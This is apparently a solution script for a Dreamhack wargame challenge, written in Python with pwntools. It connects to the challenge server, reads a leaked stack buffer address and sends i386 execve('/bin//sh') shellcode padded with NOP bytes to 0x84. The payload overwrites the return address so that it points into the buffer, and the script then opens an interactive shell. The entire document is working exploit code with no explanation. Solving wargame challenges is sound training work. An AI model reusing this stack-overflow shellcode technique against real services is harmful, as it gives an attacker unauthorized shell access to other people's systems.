from pwn import *
context(arch='i386')

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_000')
else:
    r = remote('host1.dreamhack.games', 19778)

r.recvuntil('0x')
buf = int(r.recvline()[:-2], 16) # buf

shellcode = asm('''
xor ecx, ecx
xor edx, edx
xor eax, eax
mov al, 0x1b
sub al, 0x10
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
''')

payload = shellcode.ljust(0x84, b'\x90') + p32(buf)
r.sendline(payload)

r.interactive()